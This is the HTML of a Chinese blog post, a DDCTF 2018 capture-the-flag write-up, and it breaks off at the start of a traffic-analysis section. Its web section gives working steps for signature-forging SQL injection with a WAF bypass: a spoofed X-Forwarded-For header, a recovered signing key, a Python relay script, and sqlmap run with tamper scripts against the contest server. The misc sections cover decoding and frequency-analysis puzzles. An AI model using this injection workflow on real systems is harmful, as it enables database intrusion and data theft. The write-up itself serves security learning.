@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Ex1t">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ex1t">
+    
+    <meta name="keywords" content="hexo,ctf,writeup,dawn,hack,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>DDCTF2018_WriteUp · Ex1t&#39;s space</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/favicon.png">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ex1t&#39;s space</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">DDCTF2018_WriteUp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Ex1t's space</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            DDCTF2018_WriteUp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WriteUp">WriteUp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.9k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/04/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 数据库的秘密"></a>Web1 数据库的秘密</h2><p>这个题目是一个绕过WAF注入的题目，顺带考了一些Web的基础知识，第一次手动做WAF绕过，Mark一下<br>题目：<a href="http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php</a><br>打开提示 <code>非法链接，只允许来自 123.232.23.245 的访问</code><br>加个header：<code>x-forwarded-for:123.232.23.245</code><br>成功访问，页面为一个搜索框和数据框，看看源码发现有一个hidden的input表单项,参数为author，猜测其为注入点，进行SQL注入<br>然后发现了WAF，一开始看到WAF是安全狗，一直去找过狗的方法，结果只是表面是安全狗，实际上规则是出题人定义的,<code>/*!union select*/</code>这种一点用都没有。。。<br>一开始用hackbar来注入，直接改author然后post提示sig错误，发现还要验证sig，看了一下js，发现一个main.js和math.js，math.js是个算sha-1的js，还有一行<br><code>var key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;;</code><br>打开main.js看到了很奇怪的代码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'e f(0,4)&#123;5 7=\'\';l(i m 0)&#123;n(i!=\'c\')&#123;a=\'\';a=i+\'=\'+0[i];7+=a&#125;&#125;o k(7+4)&#125;;5 0=&#123;8:\'\',9:\'\',b:\'\',6:\'\',d:h(j v().u()/w)&#125;;e x()&#123;0[\'8\']=1.2(\'8\').3;0[\'9\']=1.2(\'9\').3;0[\'b\']=1.2(\'b\').3;0[\'6\']=1.2(\'6\').3;5 c=f(0,4);1.2(\'g\').q="p.s?r="+c+"&amp;d="+0.d;1.2(\'g\').t()&#125;'</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="string">'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure></p>
+<p>一开始还懵了，觉得是不是找错了，后来想起来以前做过这种js很奇怪的题目，可能是用eval加了混淆，直接用Web Developer里面的Javascript Deobfuscator插件还原正常的js<br>打开Javascript Deobfuscator后重新访问一次页面，它会记录所有编译过的js，找到main.js最后一次编译的地方，看到已经是正常的js了，copy到sublime text里面自动排版一下，得到下面的代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> obj)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="string">'sign'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            str1 = <span class="string">''</span>;</span><br><span class="line">            str1 = i + <span class="string">'='</span> + obj[i];</span><br><span class="line">            str0 += str1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex_math_enc(str0 + key)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj =</span><br><span class="line">&#123;</span><br><span class="line">    id : <span class="string">''</span>,</span><br><span class="line">    title : <span class="string">''</span>,</span><br><span class="line">    author : <span class="string">''</span>,</span><br><span class="line">    date : <span class="string">''</span>,</span><br><span class="line">    time : <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj[<span class="string">'id'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'id'</span>).value;</span><br><span class="line">    obj[<span class="string">'title'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).value;</span><br><span class="line">    obj[<span class="string">'author'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'author'</span>).value;</span><br><span class="line">    obj[<span class="string">'date'</span>] = <span class="built_in">document</span>.getElementById(<span class="string">'date'</span>).value;</span><br><span class="line">    <span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).action = <span class="string">"index.php?sig="</span> + sign + <span class="string">"&amp;time="</span> + obj.time;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).submit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>sig就是所有参数连起来的一个字符串用key算出来的sha-1，解决了sig，继续手注<br>后面花点时间fuzz一下发现 select 不会被拦截，union 和 select 一起用才会被拦截，于是想到 Boolean 注入<br>但是 =, &lt;, &gt; 都被拦截了,最后发现like和between没有过滤，可以利用like和between进行Boolean注入<br>然后比较懒，不想自己写脚本跑Boolean注入，就用python写了个中转网页用来跑sqlmap<br>web1.py:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamperInteract</span><span class="params">(param)</span>:</span></span><br><span class="line"></span><br><span class="line">    key = <span class="string">"\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165"</span></span><br><span class="line"></span><br><span class="line">    obj = dict()</span><br><span class="line">    obj[<span class="string">'id'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'title'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'author'</span>] = param</span><br><span class="line">    obj[<span class="string">'date'</span>] = <span class="string">""</span></span><br><span class="line">    obj[<span class="string">'time'</span>] = str(int(time.time()))</span><br><span class="line">    headers = &#123;<span class="string">'x-forwarded-for'</span>: <span class="string">'123.232.23.245'</span>&#125;</span><br><span class="line"></span><br><span class="line">    urlParam = <span class="string">'id='</span> + obj[<span class="string">'id'</span>] + <span class="string">'title='</span> + obj[<span class="string">'title'</span>] + <span class="string">'author='</span> + \</span><br><span class="line">        obj[<span class="string">'author'</span>] + <span class="string">'date='</span> + obj[<span class="string">'date'</span>] + <span class="string">'time='</span> + obj[<span class="string">'time'</span>] + key</span><br><span class="line">    urlParam = hashlib.sha1(urlParam.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://116.85.43.88:8080/UNWROBCEZRCYCMKH/dfe3ia/index.php?sig="</span> + \</span><br><span class="line">        urlParam + <span class="string">"&amp;time="</span> + obj[<span class="string">'time'</span>]</span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    data = &#123;<span class="string">'id'</span>: obj[<span class="string">'id'</span>], <span class="string">'title'</span>: obj[<span class="string">'title'</span>],</span><br><span class="line">            <span class="string">'author'</span>: obj[<span class="string">'author'</span>], <span class="string">'date'</span>: obj[<span class="string">'date'</span>]&#125;</span><br><span class="line">    <span class="comment">#print(data)</span></span><br><span class="line">    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        p = input()</span></span><br><span class="line"><span class="string">        print(tamperInteract(p))</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<p>webpage.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> web1 <span class="keyword">import</span> tamperInteract</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for MainHandler"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        param = self.get_argument(<span class="string">'param'</span>)</span><br><span class="line">        param = param.replace(<span class="string">'--'</span>,<span class="string">'#'</span>)</span><br><span class="line">        self.write(tamperInteract(param))</span><br><span class="line">        print(param)</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r"/"</span>, MainHandler),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">application.listen(<span class="number">8888</span>)</span><br><span class="line">tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure></p>
+<p>然后跑起来webpage.py之后用sqlmap跑<code>127.0.0.1:8888</code>就行了<br>这里sqlmap使用equaltolike和between两个tamper来绕过WAF<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/?param=admin"</span> --tamper equaltolike,between --level=2</span><br></pre></td></tr></table></figure></p>
+<p>注入成功，然后用sqlmap跑出flag<br>在 <a href="https://blog.csdn.net/qq_31481187/article/details/59727015" target="_blank" rel="noopener">SQL注入&amp;WAF绕过姿势</a> 中有比较全面的SQL注入绕过WAF的方法  </p>
+<p>Sqlmap 常用资料：<a href="https://blog.csdn.net/hxsstar/article/details/22782627" target="_blank" rel="noopener">Sqlmap Tamper整理</a>  ，<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">Sqlmap用户手册</a>  </p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc1-签到题"><a href="#Misc1-签到题" class="headerlink" title="Misc1 签到题"></a>Misc1 签到题</h2><p>flag在公告里</p>
+<h2 id="Misc2-╯°□°）╯︵-┻━┻"><a href="#Misc2-╯°□°）╯︵-┻━┻" class="headerlink" title="Misc2 (╯°□°）╯︵ ┻━┻"></a>Misc2 (╯°□°）╯︵ ┻━┻</h2><blockquote>
+<p>(╯°□°）╯︵ ┻━┻<br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</p>
+</blockquote>
+<p>题目就给了一个字符串,想了想又不是sha-1又不是md5又不是base64，最后看到字母不超过f，可能是16进制编码，解开之后也是很奇怪的字符串，看到有很多大于128的数，想想加个偏移看看。<br>然后写了个ascii值偏移的遍历，最后看到了flag，所有数减128再print出来就是flag了。  </p>
+<h2 id="Misc3-第四扩展FS"><a href="#Misc3-第四扩展FS" class="headerlink" title="Misc3 第四扩展FS"></a>Misc3 第四扩展FS</h2><blockquote>
+<p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。<br>附件：<a href="http://ddctf.didichuxing.com/files/2c9be5d2403a8ab8de577e4c50df067c/windows.jpg" target="_blank" rel="noopener">windows.jpg</a></p>
+</blockquote>
+<p>这个题的题目是真的捉弄人，跟ext4一点关系都没有。。。<br>题目给了一个图片，走程序先binwalk一下，发现有东西，解出来一个zip压缩包，是加密过的。用Hxd看了下，不是伪加密，emmm试下爆破吧，准备去爆破的时候想起来没看图片的详细信息，这个好容易忘orz。。看了下标题是cof，备注是Pactera，华为手机拍的，试了下压缩包密码就是Pactera，还好看了下不然爆破跑死了，解出来一个file.txt,<br>里面是这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">j0hz4huHCjuji1&#125;&#123;stzenozuFDTat0sj1HzeuDzs4T4tDaz1Ci0T4oa0j11juuijeHhFCah&#125;jeDH4e&#123;DDtD1DCDaTCThzH&#125;FsFntn4a1&#123;aCu1DtDjHD1DDCChCiuejsDHiD144zTHjzF4h&#125;1FhehtTiFse44HTC0z&#123;Tn0t&#123;u&#125;enh&#125;jsnet&#125;DDTDuuzziaHH0sjC4D1D41e0H&#125;1j0aH&#123;eD&#123;CeiCniDuatDjotDFhhzFDtFHeDeTHhDFCHCozFHDTDet&#125;0DeCDDDtnTD&#123;0nCo0uCTHsHs0&#125;hs1ttF0&#125;044j&#123;sThTjC&#125;HzojThhs&#123;o&#123;n&#125;ujuT10HjCTt0DhuCj&#123;Ds1FuC41suhCt0jznDuD&#125;TeDeCCD&#123;zDhFDDDDs0HCthD&#123;j1teuziiCT&#123;DD0sDDuDTDCo&#123;uFF&#125;CDo&#123;o0FCaFu0FHjTi&#123;&#125;1Cu4DD4aFunH11Feje04eThTzDsTC&#125;hHD0Tz4DC&#123;ninoFFsez&#123;0sDeFuC&#125;0j0esah4DDttjhD1D0iCteF0nH4esTtjzDuD1&#123;CittDei4hs&#123;TT&#123;Dzts&#123;0tezs4s&#123;&#125;4DDT&#123;n4&#123;0FFT4De&#125;HhjFDs1jTHCts1zsoeh1aDTnCDz&#125;hHC4FauCeu0tFT1uHh0DuzDujaC4&#123;uHeuoh1FiT1aDeC&#123;oD&#123;DhTjoCj0u&#125;sTeCiujeehT1iuztsn0hTs1a&#125;tjaTDTFsjjezDD&#125;nsssnHz&#123;FCtuDFDuDHH&#123;siTssaeaCDjo1&#123;oh</span><br><span class="line">    ...以下省略...</span><br></pre></td></tr></table></figure></p>
+<p>这又是什么加密？？没见过。。。然后看到题目是ext4，就去查ext4的资料，然而并没有什么用。。。最后看到题目里面说统计频次，尝试了下统计各字符的频次，频次由大到小排列一下，结果就是flag了。（被ext4坑死了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">raw = <span class="string">"j0hz4huHCjuji1&#125;&#123;s..."</span> <span class="comment">#这个地方省略了，太长了</span></span><br><span class="line">S = list(raw)</span><br><span class="line">u = set(S)</span><br><span class="line">d = dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> u:</span><br><span class="line">    print(i,S.count(i))</span><br><span class="line">    d[S.count(i)]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted(d,reverse=<span class="keyword">True</span>):</span><br><span class="line">    print(d[i])</span><br></pre></td></tr></table></figure></p>
+<h2 id="Misc4-流量分析"><a href="#Misc4-流量分析" class="headerlink" title="Misc4 流量分析"></a>Misc4 流量分析</h2><blockquote>
